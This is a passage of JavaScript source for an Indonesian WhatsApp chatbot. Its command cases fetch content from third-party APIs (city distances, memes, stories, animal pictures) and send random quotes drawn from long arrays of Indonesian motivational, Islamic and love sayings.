			   teks += `*Nama film* : ${i.name}\n*Quality* : ${i.quality}\n*Rating* : ${i.star}\n*Link* : ${i.url}\n=================\n`
			   }
		   reply(teks.trim())
		   await limitAdd(sender)
		   break
	   case 'modapk':
	   case 'apkmod':
	   case 'mod':
			  client.sendMessage(from, modapk(prefix), text, { quoted: mek })
			  break
	   case 'jarak':
		if (!isRegistered) return reply(mess.only.userB)
		if (isBanned) return reply(mess.only.benned)
		if (isLimit(sender)) return reply(mess.limituser)
		   if (args.length == 0) return reply(`Example: ${prefix + command} jakarta - yogyakarta`)
			   pauls = args.join(" ")
			   kota1 = pauls.split("-")[0].trim()
			   kota2 = pauls.split("-")[1].trim()
			   anu = await fetchJson(`http://api.lolhuman.xyz/api/jaraktempuh?apikey=${LolApi}&kota1=${kota1}&kota2=${kota2}`)
			   ini_txt = `Informasi Jarak dari ${kota1} ke ${kota2} :\n\n`
			   ini_txt += `Asal : ${anu.result.from.name}\n`
			   ini_txt += `Garis Lintang : ${anu.result.from.latitude}\n`
			   ini_txt += `Garis Bujur : ${anu.result.from.longitude}\n\n`
			   ini_txt += `Tujuan : ${anu.result.to.name}\n`
			   ini_txt += `Garis Lintang : ${anu.result.to.latitude}\n`
			   ini_txt += `Garis Bujur : ${anu.result.to.longitude}\n\n`
			   ini_txt += `Jarak Tempuh : ${anu.result.jarak}\n`
			   ini_txt += `Kereta Api : ${anu.result.kereta_api}\n`
			   ini_txt += `Pesawat : ${anu.result.pesawat}\n`
			   ini_txt += `Mobil : ${anu.result.mobil}\n`
			   ini_txt += `Motor : ${anu.result.motor}\n`
			   ini_txt += `Jalan Kaki : ${anu.result.jalan_kaki}`
			   reply(ini_txt)
			   await limitAdd(sender) 
			   break  
			case 'cekapikey':
			case 'cekapi':
				if (!isOwner) return reply(mess.only.ownerB)
					   api = args.join(" ")
					   anu = await fetchJson(`http://api.lolhuman.xyz/api/checkapikey?apikey=${api}`)
					   ini_txt = `Username : ${anu.result.username}\n`
					   ini_txt += `Request : ${anu.result.requests}\n`
					   ini_txt += `Today : ${anu.result.today}\n`
					   ini_txt += `Account Type : ${anu.result.account_type}\n`
					   ini_txt += `Expired : ${anu.result.expired}`
					   reply(ini_txt)
					   await limitAdd(sender) 
					   break
		   case 'urbandictionary':
			   urb = args.join(" ")
			   get_result = await fetchJson(`http://api.lolhuman.xyz/api/urdict?apikey=${LolApi}&query=${urb}`)
			   lilu = get_result.result
			   for (var x of lilu) {
				   ini_txt = `\`\`\`Meaning :\n${x.definition}\`\`\`\n\n`
				   ini_txt += `\`\`\`Link : ${x.permalink}\`\`\`\n\n`
				   ini_txt += `\`\`\`Sounds Url : ${x.sound_urls[0]}\`\`\`\n\n`
				   ini_txt += `\`\`\`Like : ${x.thumbs_up}\`\`\`\n\n`
				   ini_txt += `\`\`\`Dislike : ${x.thumbs_down}\`\`\`\n\n`
				   ini_txt += `\`\`\`Created On : \n${x.written_on}\`\`\`\n\n`
				   ini_txt += `\`\`\`Author : ${x.author}\`\`\`\n\n`
				   ini_txt += `\`\`\`Word : ${x.word}\`\`\`\n\n`
				   ini_txt += `\`\`\`Defined Id : ${x.defid}\`\`\`\n\n`
				   ini_txt += `\`\`\`Example : ${x.example}\`\`\`\n\n`
			   }
			   reply(ini_txt)
			   break
			   //other bye other
			   case 'memeindo':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
					memein = await fetchJson(`https://api.zeks.me/api/memeindo?apikey=${ZeksApi}`)
					buffer = await getBuffer(memein.result)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '.......'})
					await limitAdd(sender)
					break 
			case 'onecak':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/onecak?apikey=${LolApi}`)
                    client.sendMessage(from, ini_buffer, image, { quoted: mek })
                    await limitAdd(sender) 
                    break
             case 'alay':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
				//reply(mess.wait)
					if (args.length < 1) return reply('Teksnya mana gan?')
					anu = await fetchJson(`http://api.lolhuman.xyz/api/alay?apikey=${LolApi}&text=${body.slice(6)}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break 
				case 'alay2': // By Anker
					 // Case Case & Case				
					 if (!isRegistered) return reply(mess.only.userB)
					 if (isBanned) return reply(mess.only.benned)
					 if (isLimit(sender)) return reply(mess.limituser)
				
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					data = await fetchJson(`http://api.lolhuman.xyz/api/upperlower?apikey=${LolApi}&text=${body.slice(6)}`)
					reply(data.result)
				    await limitAdd(sender)
					break 
				case 'namaninja':
					if (!isRegistered) return reply(mess.only.userB)
		            if (isBanned) return reply(mess.only.benned)
		            if (isLimit(sender)) return reply(mess.limituser)
				    //reply(mess.wait)
					if (args.length < 1) return reply('Teksnya mana gan?')
					anu = await fetchJson(`http://api.lolhuman.xyz/api/ninja?apikey=${LolApi}&nama=${body.slice(11)}`, {method: 'get'})
					client.sendMessage(from, `${anu.result}`, text, {quoted: mek})
					await limitAdd(sender) 
					break 
			case 'cerpen':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/cerpen?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Creator : ${get_result.creator}\n`
                    ini_txt += `Story :\n${get_result.cerpen}`
                    reply(ini_txt)
					await limitAdd(sender) 
                    break
                case 'ceritahoror':
					if (!isRegistered) return reply(mess.only.userB)
					if (isBanned) return reply(mess.only.benned)
					if (isLimit(sender)) return reply(mess.limituser)		
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${LolApi}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    client.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
					await limitAdd(sender) 
                    break
			case 'anjing':
				if (!isRegistered) return reply(mess.only.userB)
		        if (isBanned) return reply(mess.only.benned)
		        if (isLimit(sender)) return reply(mess.limituser)
	            ini_url = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=anjing`)
	            ini_url = ini_url.result
	            ini_buffer = await getBuffer(ini_url)
					client.sendMessage(from, ini_buffer, image, { quoted: mek })
					await limitAdd(sender) 
					break 
			case 'kucing':
				if (!isRegistered) return reply(mess.only.userB)
				if (isBanned) return reply(mess.only.benned)
				if (isLimit(sender)) return reply(mess.limituser)
					anu = await fetchJson(`http://api.lolhuman.xyz/api/pinterest?apikey=${LolApi}&query=kucing`, {method: 'get'})
					//reply(mess.wait)
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, { quoted: mek , caption: 'meong🐈'})
					await limitAdd(sender) 
					break 
			case 'quoteskehidupan':
					 // Case Case & Case				
					 if (!isRegistered) return reply(mess.only.userB)
					 if (isBanned) return reply(mess.only.benned)
					 if (isLimit(sender)) return reply(mess.limituser)
				
					const quotes =['Jangan pernah mengabaikan apapun yang terjadi, suatu saat akan sadar dan menyesal, ingat tuhan akan selalu memberikan penyesalan terakhir ...','Aku percaya, suatu hari nanti, aku akan memiliki semua hal yang telah aku doa kan selama ini.','Balas dendam yang paling terbaik adalah mengubah dirimu menjadi yang lebih baik lagi.','Hidupku jauh dari kata mewah, kalau kalian lihat aku selalu senang, itu karena aku tau cara menikmati hidup.','Persahabatan bukan tentang orang yang baik didepanmu, tetapi tentang orang yang tetap baik di belakangmu.','Tidak semua bisa dimiliki. Jaga yang sudah termiliki. Tidak semua bisa diterima. Pertahankan yang sudah ada.','Mereka pikir hidupku enak, padahal aku hanya berusaha untuk tidak mengeluh.','Ibu, sebajingan apapun anakmu ini, Hatiku selalu ingin bisa Membahagiakanmu.','Tidak semua hari berjalan dengan baik tapi ada hal baik di setiap harinya.','Pikiran negatif tidak akan pernah memberi kamu kehidupan yang positif','Mereka pikir hidupku enak, padahal aku hanya berusaha untuk tidak mengeluh.','Saya percaya bahwa satu-satunya keberanian yang dibutuhkan oleh seseorang adalah keberanian untuk mengikuti impian Anda sendiri.','Arti hidup adalah menemukan hadiahmu. Tujuan hidup adalah untuk memberikannya.','Ada kalanya kita dicari ketika diperlukan, Dan dilupakan setelah dapat apa yang dia inginkan.','Aku suka tidur, Bukan karena aku pemalas Hanya saja mimpiku lebih indah dari kenyataan.','Jika kamu terlahir bukan dari keluarga kaya, Maka pastikanlah keluarga kaya berasal dari mu.','Saat kamu memberi orang lain, sesungguhnya pemberian itu adalah untukmu. Dan saat kamu mendoakan orang lain, sesungguhnya doa itu juga untukmu. Maka sibuklah membahagiakan orang lain, agar kemudian dunia akan sibuk membahagiakanmu.','Pernah salah pilih, Pernah salah jalan, Karena ego, Karena ceroboh, Tapi kalau bukan karena salah, Kita tidak akan pernah belajar.','Teruntuk hatiku semoga kamu sabar dan tabah bukan untuk hari ini, tapi untuk setiap hari.','Apapun yang kamu alami hari ini tetaplah terlihat baik-baik saja, are you oke?','Wajar kulitku hitam, Tanganku kasar, Penampilanku dekil, KARENA KEGIATANKU KERJA BUKAN MEMINTA.','Sibuklah mencintai hidupmu sampai kamu tidak punya waktu untuk membenci, menyesal, ataupun merasa takut.','AKU BAHAGIA KARENA BERSYUKUR, BUKAN BERSYUKUR KARENA BAHAGIA.','Hanya karena kamu bisa melakukan apa saja, bukan berarti kamu mampu melakukan segalanya.','Kegagalan adalah kesempatan untuk memulai lagi dengan cara yang lebih cerdas.','Dulu waktu masih kecil tidak sabar pengen jadi dewasa, tapi ketika udah besar, aku baru sadar bahwa jaman kecil lah yang paling bahagia.','Saya adalah saya, Saya bukan dia ataupun mereka Jika ingin bersama saya, Terimalah apa adanya.','Online ku sangatlah santai ada yang chat ya syukur, tidak ada yang chat ya tidur.','Kamu tidak begitu dalam mengenaliku, jadi tolong berhentilah sok tau tentang hidup ku.','Saya terlahir dari keluarga sederhana jadi maaf kalau penampilan saya apa adanya.','Dirimu sebenarnya adalah apa yang kamu lakukan di saat tiada orang yang melihatmu.','Ada dua pilihan hidup di pagi hari. Kembali tidur untuk melanjutkan mimpi, atau bangun tidur untuk mewujudkan mimpi.','Orang yang dibelakangku membicarakan diriku, keadaanku, keburukanku, mungkin ia membahayakan dalam duniaku tapi yang jelas ia bermanfaat untuk akhiratku, maka biarlah ia meneruskannya. *#Jangan lupa tersenyum untuk setiap harinya*','Lupakanlah masalahmu sejenak, dan berbahagialah kamu.','Mencintai memang tentang penerimaan. Tapi bukan untuk dibodohi.','Hidup adalah keseimbangan antara menggenggam dan melepaskan.','Jalanan yang sulit seringkali membawamu ke tujuan yang paling indah.','Kita tidak gagal. Kita hanya telah belajar dari 1000 cara yang salah.','Kalau kamu menginginkan sesuatu yang belum pernah kamu miliki, kamu harus melakukan sesuatu yang belum pernah kamu lakukan.','Jangan berhenti sebelum kamu bangga dengan dirimu sendiri.','Siapapun yang kamu cari.. Percayalah, dia juga sedang mencarimu.','Bahagia itu tujuan, kecewa itu jalan. Seseorang tidak akan sampai ke tujuan, tanpa melewati sebuah jalan.','Teruslah update status, setidaknya orang lain tau bahwa kamu masih hidup.','Bukan aku yang hebat. Tapi doa orang tua ku.','Kalau kamu sering disakiti orang itu artinya kamu orang baik. Ingat, cuma pohon berbuah yang dilempari batu.','Dalam hidup ini, Sadar itu penting loh, Jangan sabar mulu, CAPEK!','Kamu mempunyai banyak pilihan hidup untuk itu, Pilihlah hanya yang bisa benar-benar menjadikanmu lebih baik.','Aku kuat karena aku pernah lemah. Aku berani karena aku pernah merasa takut. Aku bijak karena aku pernah melakukan kesalahan.','Bukan berdoa untuk meminta hidup yang lebih mudah, Tapi berdoalah untuk bisa menjadi manusia yang lebih tangguh dalam menjalani hidup.','Selalu ada kisah yang kamu tidak tau di balik setiap orang. Selalu ada alasan mengapa mereka menjadi seperti itu. Pikiran hal ini sebelum kamu mencoba menghakimi orang lain.','Orang lain hanya melihat hasil akhir tanpa pernah tau bagaimana lelahnya berproses.','Kebahagiaan bukan milik mereka yang memiliki segalanya, Tetapi untuk mereka yang bisa menghargai apa yang mereka miliki.','Aku hanya ingin diperlakukan spesial lagi.','Terkadang, Hal yang menahan mu untuk bergerak maju hanyalah Pikiranmu sendiri.','Dua hal Menggambarkan dirimu : Kesabaranmu saat tak punya apa-apa Dan Sikapmu saat memiliki segalanya.','Kita hanya bersama bukan bersatu.','Saat kamu benar Semua orang lupa Saat kamu salah Semua orang ingat','Uang memang bukan segalanya tapi Tanpa uang kehidupan ini akan susah','Bila kamu Yakin , Tak perlu ada kata Mungkin','Jadilah kuat untuk melepaskan, Dan sabar untuk apa yang layak kamu dapatkan.','Pembenci itu sangat pemilih, Mereka hanya membenci orang yang hidupnya lebih baik  daripada hidup mereka.','Pasangan adalah cerminan diri kita. Maka teruslah perbaiki diri menjadi lebih baik setiap harinya, Maka pasangan terbaikpun akan diberikan tuhan.','Persahabatan adalah berbagi suka duka dan menua bersama.','Tersenyumlah ketika melihat masa lalu yang kelam, Karena engkau telah berhasil melewatinya.','Ketika banyak permasalahan yang menghampiri dirimu janganlah meminta untuk lekas dihilangkan. Tapi mintalah agar kamu bisa kuat untuk menyelesaikan.','Kehidupanmu adalah buah dari tindakan yang kamu lakukan. Tidak ada yang bisa disalahkan selain dirimu.','Kehidupan bukanlah masalah yang harus diselesaikan namun kenyataan yang harus diambil pengalamannya.','Semoga di tahun baru, Buku baru, Penulisan yang baru dengan isi yang lebih menarik untuk diimbas kembali di penghujung cerita nanti.','Masa lalu memang menyimpan banyak kenangan, Namun itu bukan alasan untuk tidak terus melangkah ke depan.','Santailah, Nikmati saja hidup, Tersenyumlah lebih banyak, Tertawalah lebih banyak, Dan janganlah memikirkan banyak hal.','Setiap perbuatan yang membahagiakan sesama adalah suatu sikap yang mencerminkan pribadi yang mulia.','Jarang yang sadar kalau kegagalan juga merupakan kesempatan emas untuk menuju kesuksesan.','Lebih baik bekerja keras dalam kediamnya kesunyian, Biarkan nanti sukses mu yang berbicara.','Belajar dari kesalahan masa lalu merupakan salah satu langkah awal untuk maju.']
					const quo = quotes[Math.floor(Math.random() * quotes.length)]
					crot = await getBuffer(`https://i.ibb.co/Bj8tD93/IMG-20210126-WA0018.jpg`)
					client.sendMessage(from, crot, image, { quoted: mek, caption: '*Quotes Kehidupan*\n\n'+ quo })
					await limitAdd(sender)
					break
		case 'quotesislami':
					 // Case Case & Case				
					 if (!isRegistered) return reply(mess.only.userB)
					 if (isBanned) return reply(mess.only.benned)
					 if (isLimit(sender)) return reply(mess.limituser)
					const islami =['Hal yang paling manis adalah ketika seseorang menyebutkan nama kamu di tahajjud mereka.','Ya Allah panggillah diriku dan orang tuaku ke baitullah dalam keadaan sehat walafiat.','Ya Allah semoga seseorang yang engkau jodohkan denganku adalah seseorang yang saat ini sedang aku perjuangkan.','Allah tidak pernah tidur. Semua pasti akan di balas kelak. Orang-orang jahat yang sekarang bisa tertawa karena banyak uang, berkuasa, tapi besok-besok mereka semua di balas seadil-adilnya.','Jangan putus asa, Allah tidak akan mengecewakan hambanya yang ingin memperbaiki diri.','Percayalah orang yang menasehatimu untuk sholat adalah dia yang paling mencintaimu.','Bukannya Allah tidak tahu sedihmu, Tapi Allah tahu kalau kamu itu kuat.','Bacalah Al-Quran, Ia akan menenangkan hatimu meskipun engkau tidak memahami artinya.','Saat kita sakit hati sama omongan orang, saat itu juga sebenarnya Allah ngajarin kita buat jaga omongan kita ke orang lain. Sederhana bukan?','Di dunia ini orang paling baik pun bisa dicela, dan bahkan orang paling jahat sekalipun bisa di bela.','Al-Quran adalah teman yang tidak akan mengecewakan kamu di dunia dan akhirat.','Cara Allah menjawab doa hambanya : Iyaa.. aku beri untukmu sekarang. Tunggu, aku ingin melihat dulu perjuanganmu. Tidak, aku punya yang lebih baik untukmu.','Dan Allah tidak akan mengadzab mereka selama mereka mau Memohon ampun kepada-Nya. [Al-Anfaal, 8:33]','Kesabaran itu ada dua macam : Sabar atas sesuatu yang tidak kamu ingin. Sabar menahan diri dari sesuatu yang kamu ingini. -Ali bin Abi Thalib','Ambillah kebenaran, jika kamu telah mendengarnya. Karena sungguh di atas kebenaran ada cahaya. (HR. Abu Daud)','Sholatlah agar hatimu tenang, Istighfarlah agar kecewamu hilang, Berdoalah agar bahagiamu segera datang.','Surga itu mahal.. Akan tetapi orang miskin tetap mampu membelinya, Karena harganya bukan pada Harta melainkan Taqwa.','Ya Allah... Perbaikilah lisanku, Perbaikilah hatiku, Perbaikilah akhlakku, Perbaikilah hidupku, Aamiin..','Semoga hari ini Allah memudahkan setiap urusan kita, melapangkan hati kita serta meringankan langkah kita, dalam kebaikan kita Aamiin.','Peganglah aku, bacalah aku setiap hari, karena aku akan menjadi penerang didalam kuburmu nanti. #Al-Quran','Kematian..Kamu terlalu banyak bercanda. Hingga sampai kamu lupa, kematian mungkin tidak menunggumu selesai tertawa.','Jangan khawatirkan rizkimu, karena Allah telah menjaminnya untukmu, namun khawatirkanlah amalanmu, karena Allah tidak menjamin surga-Nya untukmu..','Wahai orang-orang yang beriman! Ingatlah kepada Allah, Dengan mengingat (nama-Nya) sebanyak-banyaknya dan bertasbihlah kepada-nya pada waktu pagi dan petang.','Aku sangat ingin menjadi pemburu surga. Namun aku lupa bahwa aku juga buronan neraka.','Karena aku percaya apapun yang menjadi milikku akan tetap menjadi milikku. Sejauh apapun dia (mencoba) pergi. Sejauh apapun usaha orang lain ingin merebutnya dariku. Aku hanya perlu percaya pada Allah bahwa yang menjadi milikku tidak akan pernah menjadi milik orang lain.','Andai hidayah itu seperti buah yang bisa kubeli, maka akan kubeli berkeranjang-keranjang untuk aku bagikan kepada orang-orang yang aku cintai.','Bila kamu tidak melihatku di syurga. Tolong tanya kepada Allah dimana aku, Tolonglah aku ketika itu..','Hanya Allah yang mengerti bagaimana sulitnya menahan sabar tanpa harus bercerita panjang lebar.','Letakkan hpmu lalu ambil air wudhu, shalatlah kamu, Allah menunggu curhatan darimu.','Maafin aku Ya Allah Gara gara aku mencintai dia tapi tidak pasti, sampai aku lupa mencintai mu juga.','Akan ada saatnya setelah salam dari sholatku, tanganmu yang pertama kali kusentuh.','Mungkin maksud Tuhan mempertemukan kamu dengannya adalah, sekedar mengingatkan bahwa tidak semua yang kamu inginkan bisa kamu dapatkan.','Percayalah Seorang wanita yang mencintai Allah. Allah akan berikan lelaki terbaik untuk menjaganya.','Berterimakasihlah kepada tuhan, Yang memberimu hidup dan kehidupan.','Mungkin kamu hanya harus sedikit peka untuk menyadari petunjuk dari Tuhan atas doa-doamu.']
					const isl = islami[Math.floor(Math.random() * islami.length)]
					islamya = await getBuffer(`https://i.ibb.co/dPnjvD3/IMG-20210127-WA0018.jpg`)
					client.sendMessage(from, islamya, image, { quoted: mek, caption: '*Quotes Islami*\n\n'+ isl })
					await limitAdd(sender)
					break	
		case 'quotesnasehat':
					 // Case Case & Case				
					 if (!isRegistered) return reply(mess.only.userB)
					 if (isBanned) return reply(mess.only.benned)
					 if (isLimit(sender)) return reply(mess.limituser)				
					const nasehat =['Jangan pernah mengabaikan apapun yang terjadi, suatu saat akan sadar dan menyesal, ingat tuhan akan selalu memberikan penyesalan terakhir ...','Ingat iya.. Perilaku mu bisa mengubah perasaan seseorang.','Setia itu bukan yang selalu ada, namun saat tak bersama dia tahu hatinya milik siapa.','Kamu perlu belajar satu hal : "Menghargai seriusnya seseorang."','Jangan cari yang sempurna, Sempurnakan saja yang ada.','Ketika seseorang menghina kamu, itu adalah sebuah pujian bahwa selama ini mereka menghabiskan banyak waktu untuk memikirkan kamu, bahkan ketika kamu tidak memikirkan mereka.','Yang terbaik tidak akan hilang. Jika dia hilang maka dia bukanlah yang terbaik.','Percayalah. Suatu hari nanti pasti akan ada seseorang yang bangga memilikimu.','Tidak ada karya yang pernah dibuat oleh seorang seniman yang malas.','Jika seseorang memberimu perhatian jangan pernah mengabaikannya karena suatu saat perhatian sekecil itu kamu rindukan saat kamu kesepian.','Bersyukurlah.. Untuk segala apapun yang engkau miliki saat ini, sebab nikmat itu akan bertambah ketika kamu dapat mensyukuri apa yang telah diberi saat ini. #Buat diri ini jangan banyak mengeluh yah.','Ada perbedaan antara menyerah dan tau kapan kamu merasa cukup dalam berusaha.','Jangan sampai kesenanganmu menyusahkan orang lain. Jangan pula kesusahanmu menyenangkan orang lain.','Semakin banyak kamu memberi, semakin banyak pula yang akan kembali padamu.','Jangan pernah bandingkan akhir kesuksesan orang lain dengan pertengahan prosesmu.','Lakukan apa yang kamu bisa, dengan apa kamu miliki, dimanapun kamu berada.','Hidup memang bukan balapan, tetapi kamu memang perlu untuk terus bergerak maju.','NIKMATI HIDUPMU, LUPAKAN UMURMU.','Sebaik-baiknya permintaan maaf adalah membaiknya tingkah laku.','Belajarlah memahami bahwa tidak semua keinginan bisa terpenuhi, barangkali itu adalah obat yang terbaik untuk mencegah kecewa dan sakit hati.','Kamu akan menemukan yang terbaik, ketika kamu sudah berhenti membanding-bandingkan.','Jangan menilai orang dari masa lalunya karena kita semua sudah tidak hidup disana. Semua orang bisa berubah, biarkan mereka membuktikannya.','Jika dia tidak merasakan kehadiranmu, buat dia merasakan kepergianmu.','Orang pintar mampu memecahkan masalah. Orang bijak mampu menghindarinya.','Bersikap tidak lagi peduli lebih baik dari pada balas dendam.','Tegas akan diri sendiri, buang pikiran negatif dan lakukan yang baik. Kegelisahan hanya milik mereka yang putus asa.','Jangan pikirkan kegagalan kemarin, hari ini sudah lain, sukses pasti diraih selama semangat masih menyengat.','Memaafkanmu bukan berarti memberimu kesempatan sekali lagi.','Berubah menjadi lebih baik adalah pilihan. Tapi, merasa paling baik adalah kesalahan.','Jangan pernah bandingkan dirimu dengan orang lain, tapi bandingkanlah dengan dirimu yang lalu, apakah hari ini sudah lebih baik?','Ketahuilah orang yang paling sering memberi nasihat kepadamu, itulah orang yang paling mencintai kamu.','Jangan pernah berhenti belajar, karena hidup tidak pernah berhenti mengajarkan.','Salah satu tanda dirimu tidak berakhlak adalah main HP ketika ada orang yang berbicara.','Raihlah kesuksesan yang tidak seseorangpun berfikir kamu bisa meraihnya. Buktikan pada mereka kalau kamu bisa!','Kesalahan adalah bukti nyata kalau kamu pernah mencoba. Jangan takut salah. Takutlah untuk melakukan kesalahan-kesalahan yang sama dua kalinya.','Cepat atau lambat bukan masalah. Selama kamu tetap bergerak maju, tidak ada akhirnya kamu akan tetap sampai tidak ada tujuan.','Jika kamu tidak bisa membahagiakan orang lain, Setidaknya janganlah kamu tambah dukanya.','Teruslah berusaha sampai temanmu berkata kepadamu "Sombong iya sekarang."','Ketika kamu melakukan sebuah kesalahan, Akuilah dan jangan ragu untuk meminta maaf. Tidak pernah ada satupun orang dalam sejarah yang mati tersedak karena menelan gengsinya sendiri.','Syukuri yang menyayangimu, Maafkan yang menyakitimu.','Tunjukkan keburukanmu, lalu lihat siapa yang bertahan.','Kamu boleh lelah, tetapi tidak boleh menyerah untuk selamanya.','Jangan pernah lupa bilang "Terima Kasih." Jangan pernah gengsi bilang "Maaf." Jangan pernah jadi terlalu sombong untuk bilang "Tolong."','Masa lalu tidak bisa berubah, diubah, dilupakan, ataupun di hapus. Masa lalu hanya bisa di terima','Kita ini.. sangat pintar menghakimi, Namun bodoh dalam memperbaiki diri.','Tidak peduli seberapa baiknya kamu, Kebaikan tidak akan berarti apa-apa jika kamu memberikan kepada orang yang salah.','Orang sabar selalu menang, Orang tamak selalu rugi, Orang marah selalu kalah, Orang baik selalu diuji.','Carilah tempat dimana kamu bisa dihargai, Bukan dibutuhkan. Karena banyak orang mencarimu hanya saat butuh saja, Hingga lupa bagaimana cara menghargaimu.','Melupakan orang yang melukaimu adalah hadiahmu untuk mereka. Memaafkan orang yang melukaimu adalah hadiahmu untuk dirimu sendiri.','Maafkan orang yang menyakitimu... Bukan karena mereka pantas di maafkan, Tapi karena kamu harus berbahagia.','Tetaplah kuat, Tetaplah positif, Buatlah mereka bertanya-tanya bagaimana kamu masih tetap bisa tersenyum.','Jangan meninggalkan yang pasti demi yang mungkin. Sebab semua kemungkinan, belum tentu menjadi kepastian.','Seseorang pernah berkata padaku, Merelakan bukan berarti menyerah, Tapi tidak bisa dipaksakan.','Ikuti alurnya, Nikmati prosesnya, Tuhan tau kapan kita harus bahagia.','Usia hanyalah angka, Hanya mereka yang terus berusaha yang berhasil.','Jangan pernah meremehkan siapapun! Karena sukses adalah balas dendam Terbaik.','Pria sejati.. Harus menyelesaikan apa yang sudah dimulai.','Jika kau ingin terbang, Kau harus melepaskan hal-hal yang membuatmu berat.','Siapapun yang meremehkan mu hari ini, Suatu saat harus kamu lewati.','Jangan Mencintai terlalu mudah, Jangan Percaya terlalu cepat, Jangan Berhenti terlalu dini, Jangan Berharap terlalu tinggi, Jangan Bicara terlalu banyak.','Jadilah orang baik tapi jangan biarkan orang lain mengambil keuntungan dari mu. Ketahuilah kapan kamu harus bilang tidak.','Sahabat sejati adalah mereka tau semua kelemahan mu, Tapi tidak menggunakan nya untuk menjatuhkan mu.','Ada tiga hal yang harus dimiliki dalam hidup yaitu : Perubahan, Pilihan dan Prinsip.','Orang bodoh mengira dirinya bijak. orang bijak tau dirinya bodoh.','Jatuh cintalah seperlunya.. Kemudian patah hatilah secukupnya. Karena semua ada porsinya, Karena semua ada masanya.','Kita tidak pernah tau jalan hidup seseorang.. Maka ada baiknya jika kita tidak menghakiminya atas keputusan dalam hidupnya.','Jangan pernah menyesal mengenal seseorang dalam hidupmu, Orang baik akan memberi mu Kebahagiaan, Orang jahat akan memberi mu Pengalaman, Bahkan seburuk-buruk manusia akan memberi mu Pelajaran.','Jangan menilai kedewasaan dari usia seseorang, Karena itu bukan jaminan.']
					const nsh = nasehat[Math.floor(Math.random() * nasehat.length)]
					nase = await getBuffer(`https://i.ibb.co/bspYPtC/IMG-20210125-WA0018.jpg`)
					client.sendMessage(from, nase, image, { quoted: mek, caption: '*Quotes Nasehat*\n\n'+ nsh })
					await limitAdd(sender)
					break	
		case 'quotescinta':
					 // Case Case & Case				
					 if (!isRegistered) return reply(mess.only.userB)
					 if (isBanned) return reply(mess.only.benned)
					 if (isLimit(sender)) return reply(mess.limituser)		
					const cinta =['Tidak ada obat untuk cinta kecuali untuk lebih mencintai','Cinta terdiri dari satu jiwa yang mendiami dua tubuh','Cinta tidak membuat dunia berputar. Cinta itulah yang membuat perjalanan itu berharga','Lebih baik mencintai dan kehilangan daripada tidak pernah mencintai sama sekali','Kita paling hidup saat kita sedang jatuh cinta','Cinta adalah guru yang lebih baik daripada kewajiban','Cinta tidak menemukan orang yang sempurna. Tapi, melihat orang yang tidak sempurna dengan cara yang sempurna','Cinta bukanlah sesuatu yang kamu temukan. Cinta adalah sesuatu yang menemukanmu','Cinta itu seperti angin. Kamu tidak dapat melihatnya, tetapi kamu dapat merasakannya']
					const cin = cinta[Math.floor(Math.random() * cinta.length)]
					cta = await getBuffer(`https://i.ibb.co/vL5x6F7/IMG-20210126-WA0018.jpg`)
					client.sendMessage(from, cta, image, { quoted: mek, caption: '*Quotes Cinta*\n\n'+ cin })
					await limitAdd(sender)
					break
		case 'quotesmotivasi':
					 // Case Case & Case				
					 if (!isRegistered) return reply(mess.only.userB)
					 if (isBanned) return reply(mess.only.benned)
					 if (isLimit(sender)) return reply(mess.limituser)				
					const motiv =['Nilai sebuah tindakan terletak dalam usaha menyelesaikan sampai tuntas','Kebaikan adalah seorang yang matanya penuh perhatian, serta tangannya yang penuh manfaat','Hiduplah seperti kamu akan mati besok, dan berbahagialah seperti kamu akan hidup selamanya','Kita tidak usah saling menyalahkan, agar dimasa depan tak ada yang menuntut akan kesalahan','Ketika semua hal tidak sejalan dengan anda, ingatlah bahwa sebuah pesawat terbang melawan angin, bukan dengan mengikuti angin','Belajarlah menikmati apa yang kamu miliki, itu akan membuat hidupmu lebih bernilai','Selalu ada kegelapan yang tergelap sebelum terbitnya fajar','Sahabat itu seperti bintang, tak selalu Nampak tetapi selalu ada dihati','Sibuk bukanlah jaminan karir karena hasil jauh lebih didengar orang','semua kemajuan tidak akan ada tanpa kesalahan, kesalahan adalah bagian dari kemajuan selama diakui dan diperbaiki','Sukses meninggalkan jejak, gagal meninggalkan pelajaran, diam meninggalkan penyesalan','Keraguan bersahabat dekat dengan kegagalan','uang tidak merusak seseorang, keserakahan lah yang merusak manusia','Kepercayaan tidak bisa dibeli, tapi kepercayaan bisa dipelihara','Impian, target, kemauan dan tujuan semuanya sia-sia tanpa tindakan','usia bisa berbohong tapi kedewasaan tidak','Ada yang lebih berharga dari uang dan emas yaitu waktu','Tidak ada yang gagal mereka hanya berhenti terlalu cepat','Terasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Seseorang tidak bisa sukses seringkali karena kurangnya keberanian untuk mencobaterasa sakit selalu hampir tidak ada rasanya setelah apa yang kita perjuangkan tercapai','Bicaralah secukupnya, lakukanlah semampunya. Jangan melakukan sebaliknya','Ada saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','jangan takut karena masalah yang anda hadapi tidak lebih besar dari jalan keluarnya, Allah siapkan bagi andaAda saatnya penundaan memberikan keuntungan terutama saat terlalu emosi untuk mengambil keputusan','Kadang cara terbaik untuk 